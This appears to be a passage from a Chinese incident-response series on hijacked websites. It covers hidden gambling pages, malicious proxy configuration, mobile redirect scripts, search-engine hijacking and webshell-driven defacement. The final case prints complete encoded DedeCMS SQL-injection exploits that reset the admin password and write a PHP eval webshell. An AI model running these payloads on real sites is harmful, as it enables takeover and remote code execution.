\u7f51\u7ad9\u5b58\u5728\u9ad8\u5371\u6f0f\u6d1e\uff0c\u5e38\u89c1\u4e8e\u4e00\u4e9b\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u7684\u5f00\u6e90CMS\uff0c\u5229\u75280day\u6279\u91cf\u62ff\u7ad9\u4e0a\u4f20\u9ed1\u9875\u3002 \u73b0\u8c61\u63cf\u8ff0\uff1a \u00b6 \u67d0\u7f51\u7ad9\u88ab\u6302\u4e86\u975e\u5e38\u591a\u535a\u5f69\u94fe\u63a5\uff0c\u94fe\u63a5\u5f62\u5f0f\u5982\u4e0b\uff1a http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html http://www.xxx.com/upload/aomendduchangzaixian/index.html http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html \u94fe\u63a5\u53ef\u4ee5\u8bbf\u95ee\uff0c\u76f4\u63a5\u8bbf\u95ee\u7269\u7406\u8def\u5f84\u4e5f\u53ef\u4ee5\u770b\u5230\u6587\u4ef6\uff0c\u4f46\u662f\u6253\u5f00\u7f51\u7ad9\u76ee\u5f55\u5e76\u6ca1\u6709\u53d1\u73b0\u8fd9\u4e9b\u6587\u4ef6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u5230\u5e95\u85cf\u5728\u4e86\u54ea\uff1f \u8bbf\u95ee\u8fd9\u4e9b\u94fe\u63a5\uff0c\u8df3\u8f6c\u5230\u5982\u56fe\u9875\u9762\uff1a \u95ee\u9898\u5904\u7406\uff1a \u00b6 1\u3001\u6253\u5f00\u7535\u8111\u6587\u4ef6\u5939\u9009\u9879\u5361\uff0c\u53d6\u6d88\u201d\u9690\u85cf\u53d7\u4fdd\u62a4\u7684\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u201c\u52fe\u9009\uff0c\u628a\u201d\u9690\u85cf\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u201c\u4e0b\u9762\u7684\u5355\u9009\u9009\u62e9\u201c\u663e\u793a\u9690\u85cf\u7684\u6587\u4ef6\u3001\u6587\u4ef6\u5939\u548c\u9a71\u52a8\u5668\u201d\u3002 2\u3001\u518d\u6b21\u67e5\u770b\uff0c\u53ef\u4ee5\u770b\u5230\u534a\u900f\u660e\u7684\u6587\u4ef6\u5939\uff0c\u6e05\u695a\u9690\u85cf\u6587\u4ef6\u5939\u53ca\u6240\u6709\u9875\u9762 3\u3001\u7136\u540e\u6e05\u9664IIS\u4e34\u65f6\u538b\u7f29\u6587\u4ef6 C:\\inetpub\\temp\\IIS Temporary Compressed Files\\WEBUI$ _gzip_D \\WEB\\WEBUI\\UPLOAD 4\u3001\u6295\u8bc9\u5feb\u7167\uff0c\u7533\u8bf7\u5220\u9664\u76f8\u5173\u7684\u7f51\u9875\u6536\u5f55\uff0c\u51cf\u5c11\u5bf9\u7f51\u7ad9\u7684\u5f71\u54cd\u3002 \u7b2c4\u7bc7\uff1a\u65b0\u95fb\u6e90\u7f51\u7ad9\u52ab\u6301 \u00b6 \u65b0\u95fb\u6e90\u7f51\u7ad9\u4e00\u822c\u6743\u91cd\u8f83\u9ad8\uff0c\u6536\u5f55\u5feb\uff0c\u80fd\u591f\u88ab\u641c\u7d22\u5f15\u64ce\u4f18\u5148\u6536\u5f55\uff0c\u662f\u9ed1\u7070\u4ea7\u63a8\u5e7f\u5f15\u6d41\u7684\u5fc5\u4e89\u4e4b\u5730\uff0c\u5f88\u5bb9\u6613\u6210\u4e3a\u88ab\u653b\u51fb\u7684\u5bf9\u8c61\u3002\u88ab\u9ed1\u4ee5\u540e\u4e3b\u8981\u6302\u7684\u4e0d\u826f\u4fe1\u606f\u5185\u5bb9\u4e3b\u8981\u662f\u535a\u5f69\u516d\u5408\u5f69\u7b49\u8d4c\u535a\u7c7b\u5185\u5bb9\uff0c\u65b0\u95fb\u6e90\u7f51\u7ad9\u7a0b\u5e8f\u65e0\u8bba\u662f\u81ea\u4e3b\u5f00\u53d1\u7684\u8fd8\u662f\u5f00\u6e90\u7a0b\u5e8f\uff0c\u90fd\u6709\u88ab\u9ed1\u7684\u53ef\u80fd\uff0c\u5f00\u6e90\u7a0b\u5e8f\u66f4\u5bb9\u6613\u88ab\u9ed1\u3002 \u73b0\u8c61\u63cf\u8ff0\uff1a \u00b6 \u67d0\u65b0\u95fb\u6e90\u7f51\u7ad9\u9996\u9875\u5e7f\u544a\u94fe\u63a5\u88ab\u52ab\u6301\u5230\u83e0\u83dc\u7f51\u7ad9 \u6709\u4e09\u4e2a\u5e7f\u544a\u4e13\u9898\uff0c\u94fe\u63a5\u5f62\u5f0f\u5982\u4e0b\uff1a http://www.xxx.cn/zhuanti/yyysc/index.shtml http://www.xxx.cn/zhuanti/wwwsc/index.shtml http://www.xxx.cn/zhuanti/zzzsc/index.shtml \u70b9\u51fb\u8fd9\u4e09\u6761\u94fe\u63a5\u4f1a\u8df3\u8f6c\u5230\u535a\u5f69\u7f51\u7ad9\u3002\u7b80\u5355\u6293\u5305\u5206\u6790\u4e00\u4e0b\u8fc7\u7a0b\uff1a \u53ef\u4ee5\u53d1\u73b0\u6b64\u65f6\u8fd9\u4e2a\u8fd4\u56de\u9875\u9762\u5df2\u88ab\u52ab\u6301\uff0c\u5e76\u4e14\u52a0\u8f7d\u4e86\u7b2c\u4e09\u65b9js\u6587\u4ef6\uff0c http://xn--dpqw2zokj.com/N/js/dt.js \uff0c\u8fdb\u4e00\u6b65\u8bbf\u95ee\u8be5\u6587\u4ef6\uff1a dt.js\u8fdb\u4e00\u6b65\u52a0\u8f7d\u4e86\u53e6\u4e00\u6761js\uff0c\u8bbf\u95eehttp://xn--dpqw2zokj.com/N/js/yz.js \u6211\u4eec\u53d1\u73b0\u94fe\u63a5\u8df3\u8f6c\u5230https://lemcoo.com/?dt\uff0c\u8fdb\u4e00\u6b65\u8bbf\u95ee\u8fd9\u4e2a\u94fe\u63a5\uff0c\u7f51\u7ad9\u4e3a\u535a\u5f69\u94fe\u63a5\u5bfc\u822a\u7f51\u7ad9\uff0c\u8bbf\u95ee\u540e\u4f1a\u968f\u673a\u8df3\u8f6c\u5230\u7b2c\u4e09\u65b9\u8d4c\u535a\u7f51\u7ad9\u3002 \u95ee\u9898\u5904\u7406\uff1a \u00b6 \u627e\u5230url\u5bf9\u5e94\u7684\u6587\u4ef6\u4f4d\u7f6e\uff0c\u5373\u4f7f\u6587\u4ef6\u88ab\u5220\u9664\uff0c\u94fe\u63a5\u4f9d\u7136\u53ef\u4ee5\u8bbf\u95ee\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e09\u6761\u94fe\u63a5\u90fd\u662f\u4ee5\u201csc\u201d\u540e\u7f00\u3002 \u5bf9Nginx\u914d\u7f6e\u6587\u4ef6\u8fdb\u884c\u6392\u67e5\uff0c\u53d1\u73b0Nginx\u914d\u7f6e\u6587\u4ef6VirtualHost.conf\u88ab\u7be1\u6539\uff0c\u901a\u8fc7\u53cd\u5411\u4ee3\u7406\u5339\u914d\u4ee5\u201csc\u201d\u540e\u7f00\u7684\u4e13\u9898\u94fe\u63a5\uff0c\u52ab\u6301\u5230 http://103.233.248.163 \uff0c\u8be5\u7f51\u7ad9\u4e3a\u535a\u5f69\u94fe\u63a5\u5bfc\u822a\u7f51\u7ad9\u3002 \u5220\u9664\u6076\u610f\u4ee3\u7406\u540e\uff0c\u4e13\u9898\u94fe\u63a5\u8bbf\u95ee\u6062\u590d\u3002 \u7b2c5\u7bc7\uff1a\u79fb\u52a8\u7aef\u52ab\u6301 \u00b6 PC\u7aef\u8bbf\u95ee\u6b63\u5e38\uff0c\u79fb\u52a8\u7aef\u8bbf\u95ee\u51fa\u73b0\u5f02\u5e38\uff0c\u6bd4\u5982\u63d2\u5165\u5f39\u7a97\u3001\u5d4c\u5165\u5f0f\u5e7f\u544a\u548c\u8df3\u8f6c\u5230\u7b2c\u4e09\u65b9\u7f51\u7ad9\uff0c\u5c06\u5e72\u6270\u7528\u6237\u7684\u6b63\u5e38\u4f7f\u7528\uff0c\u5bf9\u7528\u6237\u4f53\u9a8c\u9020\u6210\u6781\u5927\u4f24\u5bb3\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u90e8\u5206\u7f51\u7ad9\u7528\u6237\u53cd\u9988\uff0c\u624b\u673a\u6253\u5f00\u7f51\u7ad9\u5c31\u4f1a\u8df3\u8f6c\u5230\u8d4c\u535a\u7f51\u7ad9\u3002 \u95ee\u9898\u5904\u7406 \u00b6 \u8bbf\u95ee\u7f51\u7ad9\u9996\u9875\uff0c\u6293\u53d6\u5230\u4e86\u4e00\u6761\u6076\u610fjs\uff1a http://js.zadovosnjppnywuz.com/caonima.js \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u8fd9\u6bb5js\u4ee3\u7801\u5224\u65ad\u624b\u673a\u8bbf\u95ee\u6765\u6e90\uff0c\u52ab\u6301\u79fb\u52a8\u7aef\uff08\u5982\u624b\u673a\u3001ipad\u3001Android\u7b49\uff09\u6d41\u91cf\uff0c\u8df3\u8f6c\u5230 https://262706.com\u3002 \u8fdb\u4e00\u6b65\u8bbf\u95ee https://262706.com\uff0c\u8df3\u8f6c\u5230\u8d4c\u535a\u7f51\u7ad9\uff1a \u7b2c6\u7bc7\uff1a\u641c\u7d22\u5f15\u64ce\u52ab\u6301 \u00b6 \u5f53\u4f60\u76f4\u63a5\u6253\u5f00\u7f51\u5740\u8bbf\u95ee\u7f51\u7ad9\uff0c\u662f\u6b63\u5e38\u7684\uff0c\u53ef\u662f\u5f53\u4f60\u5728\u641c\u7d22\u5f15\u64ce\u7ed3\u679c\u9875\u4e2d\u6253\u5f00\u7f51\u7ad9\u65f6\uff0c\u4f1a\u8df3\u8f6c\u5230\u4e00\u4e9b\u5176\u4ed6\u7f51\u7ad9\uff0c\u6bd4\u5982\u535a\u5f69\uff0c\u865a\u5047\u5e7f\u544a\uff0c\u6dd8\u5b9d\u641c\u7d22\u9875\u9762\u7b49\u3002\u662f\u7684\uff0c\u4f60\u53ef\u80fd\u4e86\u9047\u5230\u641c\u7d22\u5f15\u64ce\u52ab\u6301\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u4ece\u641c\u7d22\u5f15\u64ce\u6765\u7684\u6d41\u91cf\u81ea\u52a8\u8df3\u8f6c\u5230\u6307\u5b9a\u7684\u7f51\u9875 \u95ee\u9898\u5904\u7406 \u00b6 \u901a\u8fc7\u5bf9index.php\u6587\u4ef6\u8fdb\u884c\u4ee3\u7801\u5206\u6790\uff0c\u53d1\u73b0\u8be5\u6587\u4ef6\u4ee3\u7801 \u5bf9\u6765\u81ea\u641c\u72d7\u548c\u597d\u641c\u7684\u8bbf\u95ee\u8fdb\u884c\u6d41\u91cf\u52ab\u6301\u3002 \u8fdb\u4e00\u6b65\u8ddf\u7740include\u51fd\u6570\u5305\u542b\u7684\u6587\u4ef6\uff0cindex,php\u5305\u542b/tmp/.ICE-unix/.. /c.jpg\u3002 \u8fdb\u5165/tmp\u76ee\u5f55\u8fdb\u884c\u67e5\u770b\uff0c\u53d1\u73b0\u8be5\u76ee\u5f55\u4e0b\uff0c\u5982c.jpg\u7b49\u6587\u4ef6\uff0c\u5305\u542b\u7740\u4e00\u5957\u535a\u5f69\u52ab\u6301\u7684\u7a0b\u5e8f\u3002 \u7b2c7\u7bc7\uff1a\u7f51\u7ad9\u9996\u9875\u88ab\u7be1\u6539 \u00b6 \u7f51\u7ad9\u9996\u9875\u88ab\u975e\u6cd5\u7be1\u6539\uff0c\u662f\u7684\uff0c\u5c31\u662f\u4f60\u4e00\u6253\u5f00\u7f51\u7ad9\u5c31\u77e5\u9053\u81ea\u5df1\u7684\u7f51\u7ad9\u51fa\u73b0\u4e86\u5b89\u5168\u95ee\u9898\uff0c\u7f51\u7ad9\u7a0b\u5e8f\u5b58\u5728\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u4e0a\u4f20\u811a\u672c\u6728\u9a6c\uff0c\u4ece\u800c\u5bf9\u7f51\u7ad9\u5185\u5bb9\u8fdb\u884c\u7be1\u6539\u3002\u800c\u8fd9\u79cd\u7be1\u6539\u4e8b\u4ef6\u5728\u67d0\u4e9b\u573a\u666f\u4e0b\uff0c\u4f1a\u88ab\u65e0\u9650\u653e\u5927\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u7f51\u7ad9\u9996\u9875\u88ab\u6076\u610f\u7be1\u6539\uff0c\u6bd4\u5982\u590d\u5236\u539f\u6765\u7684\u56fe\u7247\uff0cPS\u4e00\u4e0b\uff0c\u7136\u540e\u66ff\u6362\u4e0a\u53bb\u3002 \u95ee\u9898\u5904\u7406 \u00b6 1\u3001 \u786e\u8ba4\u7be1\u6539\u65f6\u95f4 \u901a\u8fc7\u5bf9\u88ab\u7be1\u6539\u7684\u56fe\u7247\u8fdb\u884c\u67e5\u770b\uff0c\u786e\u8ba4\u56fe\u7247\u7be1\u6539\u65f6\u95f4\u4e3a2018\u5e7404\u670818\u65e5 19:24:07 \u3002 2\u3001\u8bbf\u95ee\u65e5\u5fd7\u6eaf\u6e90 \u901a\u8fc7\u56fe\u7247\u4fee\u6539\u7684\u65f6\u95f4\u8282\u70b9\uff0c\u53d1\u73b0\u53ef\u7591IP\uff1a113.xx.xx.24 \uff08\u4ee3\u7406IP\uff0c\u65e0\u6cd5\u8ffd\u6eaf\u771f\u5b9e\u6765\u6e90\uff09\uff0c\u8bbf\u95eeimage.jsp\uff08\u811a\u672c\u6728\u9a6c\uff09\uff0c\u5e76\u968f\u540e\u8bbf\u95ee\u4e86\u88ab\u7be1\u6539\u7684\u56fe\u7247\u5730\u5740\u3002 \u8fdb\u4e00\u6b65\u5ba1\u67e5\u6240\u6709\u7684\u65e5\u5fd7\u6587\u4ef6(\u65e5\u5fd7\u4fdd\u5b58\u65f6\u95f4\u4ece2017-04-20\u81f32018-04-19)\uff0c\u53d1\u73b0\u4e00\u5171\u53ea\u6709\u4e24\u6b21\u8bbf\u95eeimage.jsp\u6587\u4ef6\u7684\u8bb0\u5f55\uff0c\u5206\u522b\u662f2018-04-18\u548c2017-09-21\u3002 image.jsp\u57282017-09-21\u4e4b\u524d\u5c31\u5df2\u7ecf\u4e0a\u4f20\u5230\u7f51\u7ad9\u670d\u52a1\u5668\uff0c\u5df2\u7ecf\u6f5c\u85cf\u957f\u8fbe\u534a\u5e74\u591a\u751a\u81f3\u66f4\u4e45\u7684\u65f6\u95f4\u3002 3\u3001\u5bfb\u627e\u771f\u76f8 \u6211\u4eec\u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u627e\u5230\u4e86\u7b54\u6848\uff0c\u53d1\u73b0\u7ad9\u70b9\u76ee\u5f55\u4e0b\u5b58\u5728ROOT.rar\u5168\u7ad9\u6e90\u7801\u5907\u4efd\u6587\u4ef6\uff0c\u5907\u4efd\u65f6\u95f4\u4e3a2017-02-28 10:35\u3002 \u901a\u8fc7\u5bf9ROOT.rar\u89e3\u538b\u7f29\uff0c\u53d1\u73b0\u6e90\u7801\u4e2d\u5b58\u5728\u7684\u811a\u672c\u6728\u9a6c\u4e0e\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\u7684\u53ef\u7591\u6587\u4ef6\u540d\u4e00\u81f4\uff08image.jsp\uff09\u3002 \u6839\u636e\u8fd9\u51e0\u4e2a\u65f6\u95f4\u8282\u70b9\uff0c\u6211\u4eec\u5c1d\u8bd5\u53bb\u8fd8\u539f\u653b\u51fb\u8005\u7684\u653b\u51fb\u8def\u5f84\u3002 \u4f46\u662f\u6211\u4eec\u5728\u8bbf\u95ee\u65e5\u5fd7\u5e76\u672a\u627e\u5230ROOT.rar\u7684\u8bbf\u95ee\u4e0b\u8f7d\u8bb0\u5f55\uff0c\u8bbf\u95ee\u65e5\u5fd7\u53ea\u4fdd\u7559\u4e86\u8fd1\u4e00\u5e74\u7684\u8bb0\u5f55\uff0c\u800c\u8fd9\u4e2awebshell\u53ef\u80fd\u5df2\u7ecf\u5b58\u5728\u4e86\u591a\u5e74\u3002 \u9ed1\u5ba2\u662f\u5982\u4f55\u83b7\u53d6webshell\u7684\u5462\uff1f \u53ef\u80fd\u662f\u901a\u8fc7\u4e0b\u8f7dROOT.rar\u5168\u7ad9\u6e90\u7801\u5907\u4efd\u6587\u4ef6\u83b7\u53d6\u5230\u5176\u4e2d\u5b58\u5728\u7684\u6728\u9a6c\u4fe1\u606f\uff0c\u6216\u8005\u51e0\u5e74\u524d\u5165\u4fb5\u5e76\u6f5c\u85cf\u4e86\u591a\u5e74\uff0c\u53c8\u6216\u8005\u662f\u4ece\u5730\u4e0b\u9ed1\u4ea7\u8d2d\u4e70\u4e86shell\uff0c\u6211\u4eec\u4e0d\u5f97\u800c\u77e5\u3002 \u672c\u6587\u7684\u793a\u4f8b\u4e2d\u653b\u51fb\u8005\u4e3a\u6211\u4eec\u7559\u4e0b\u4e86\u5927\u91cf\u7684\u8bc1\u636e\u548c\u8bb0\u5f55\uff0c\u800c\u66f4\u591a\u65f6\u5019\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6e05\u9664\u6240\u6709\u7684\u5173\u952e\u4fe1\u606f\uff0c\u8fd9\u52bf\u5fc5\u4f1a\u52a0\u5927\u8c03\u67e5\u4eba\u5458\u7684\u53d6\u8bc1\u96be\u5ea6\u3002 \u7b2c8\u7bc7\uff1a\u7ba1\u7406\u5458\u8d26\u53f7\u88ab\u7be1\u6539 \u00b6 \u4f60\u662f\u67d0\u4e00\u4e2a\u7f51\u7ad9\u7684\u7ba1\u7406\u5458\uff0c\u6709\u4e00\u5929\uff0c\u4f60\u7684\u7ba1\u7406\u5458\u8d26\u53f7admin\u5374\u767b\u5f55\u4e0d\u4e86\uff0c\u8fdb\u5165\u6570\u636e\u5e93\u67e5\u770b\uff0c\u539f\u6765\u7ba1\u7406\u5458\u8d26\u53f7\u7528\u6237\u540d\u4e0d\u5b58\u5728\u4e86\uff0c\u5374\u591a\u4e86\u53e6\u5916\u4e00\u4e2a\u7ba1\u7406\u5458\u7528\u6237\u540d\u3002\u4e0d\u5bf9\uff0c\u4e0d\u662f\u65b0\u589e\u4e86\u7ba1\u7406\u5458\uff0c\u800c\u662f\u4f60\u7684\u7ba1\u7406\u5458\u7528\u6237\u540d\u88ab\u7be1\u6539\u4e86\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u524d\u540e\u7aef\u5206\u79bb\uff0c\u540e\u53f0\u53ea\u5141\u8bb8\u5185\u7f51\u8bbf\u95ee\uff0c\u7ba1\u7406\u5458\u8d26\u53f7admin\u5374\u4f9d\u7136\u88ab\u591a\u6b21\u88ab\u7be1\u6539 \u95ee\u9898\u5904\u7406 \u00b6 1\u3001\u7f51\u7ad9webshell \u5728\u9488\u5bf9\u7f51\u7ad9\u6839\u76ee\u5f55\u8fdb\u884cwebshell\u626b\u63cf\uff0c\u53d1\u73b0\u5b58\u5728\u811a\u672c\u6728\u9a6c\uff0c\u521b\u5efa\u65f6\u95f4\u4e3a2018-06-13 04:30:30 2\u3001 \u5b9a\u4f4dIP \u901a\u8fc7\u6728\u9a6c\u521b\u5efa\u65f6\u95f4\uff0c \u67e5\u770b\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\uff0c\u5b9a\u4f4d\u5230IP\u4e3a\uff1a180.xx.xx.3 3\u3001\u5173\u8054\u5206\u6790 \u5168\u5c40\u641c\u7d22\u4e0e\u8be5IP\u6709\u5173\u7684\u64cd\u4f5c\u65e5\u5fd7\uff1a \u5728\u811a\u672c\u6728\u9a6c\u751f\u6210\u524d\uff0c\u6709\u4e24\u6761\u6bd4\u8f83\u53ef\u7591\u7684\u8bbf\u95ee\u65e5\u5fd7\u5438\u5f15\u4e86\u6211\u4eec\u7684\u6ce8\u610f\uff1a 172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] \"GET /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 HTTP/1.1\" 200 67 172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] \"GET /plus/ad_js.php?aid=19 HTTP/1.1\" 200 32 \u5bf9\u8fd9\u6bb5POC\u8fdb\u884c\u89e3\u7801\uff0c\u6211\u4eec\u53d1\u73b0\u901a\u8fc7\u8fd9\u4e2apoc\u53ef\u4ee5\u5f80\u6570\u636e\u5e93\u4e2d\u63d2\u5165\u6570\u636e\uff0c\u8fdb\u4e00\u6b65\u8bbf\u95ee/plus/ad_js.php?aid=19 \u5373\u53ef\u5728plus\u76ee\u5f55\u751f\u6210read.php\u811a\u672c\u6587\u4ef6\u3002 \u89e3\u7801\u540e\uff1a cfg_dbprefixmyad SET normbody = '<?php file_put_contents(''read.php'',''<?php eval($_POST[x]);echo mOon;?>'');?>' WHERE aid` =19 # \u7efc\u4e0a\uff0c\u53ef\u4ee5\u63a8\u6d4b/plus/download.php\u4e2d\u53ef\u80fd\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u63a5\u4e0b\u6765\uff0c\u6536\u96c6\u7f51\u4e0a\u5df2\u516c\u5f00\u7684\u6709\u4ee5\u4e0b3\u79cdEXP\u8fdb\u884c\u6f0f\u6d1e\u590d\u73b0\u3002 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5229\u7528\u65b9\u5f0f\u4e00\uff1a\u4fee\u6539\u540e\u53f0\u7ba1\u7406\u5458 1\u3001\u65b0\u5efa\u7ba1\u7406\u5458\u8d26\u53f7test/test123789\uff0c\u53ef\u4ee5\u6210\u529f\u767b\u5f55\u7f51\u7ad9\u540e\u53f0 2\u3001\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a cfg_dbprefixadmin SETuserid='spider',pwd`='f297a57a5a743894a0e4' where id=19 # \u4fee\u6539\u540e\u53f0\u7ba1\u7406\u5458\u4e3a\uff1a\u7528\u6237\u540dspider\uff0c\u5bc6\u7801admin\u3002 \uff083\uff09\u5bf9\u5e94\u7684EXP: \uff1fopen=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=97&arrs2[]=100&arrs2[]=109&arrs2[]=105&arrs2[]=110&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=117&arrs2[]=115&arrs2[]=101&arrs2[]=114&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=115&arrs2[]=112&arrs2[]=105&arrs2[]=100&arrs2[]=101&arrs2[]=114&arrs2[]=39&arrs2[]=44&arrs2[]=32&arrs2[]=96&arrs2[]=112&arrs2[]=119&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=102&arrs2[]=50&arrs2[]=57&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=97&arrs2[]=55&arrs2[]=52&arrs2[]=51&arrs2[]=56&arrs2[]=57&arrs2[]=52&arrs2[]=97&arrs2[]=48&arrs2[]=101&arrs2[]=52&arrs2[]=39&arrs2[]=32&arrs2[]=119&arrs2[]=104&arrs2[]=101&arrs2[]=114&arrs2[]=101&arrs2[]=32&arrs2[]=105&arrs2[]=100&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 \u6267\u884cEXP\u540e\uff0c\u76f8\u5e94\u540e\u53f0\u6570\u636e\u5e93\u8868\u53d8\u4e3a\u5982\u4e0b\uff1a \uff084\uff09\u56e0\u6b64\u76f8\u5e94\u540e\u53f0\u767b\u5f55\u7528\u6237\u53d8\u4e3aspider\u5bc6\u7801admin \u5229\u7528\u65b9\u5f0f\u4e8c\uff1a\u901a\u8fc7/plus/mytag_js.php\u6587\u4ef6\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6cphp \uff081\uff09\u5982\uff1a\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a `cfg_dbprefixmytag(aid,expbody,normbody) VALUES(9013,@\\','{dede:php}file_put_contents(''90sec.php'',''<?php eval($_POST[guige]);?>'');{/dede:php}') # @\\'`` \uff082\uff09\u5bf9\u5e94\u7684EXP: ?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=51&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96 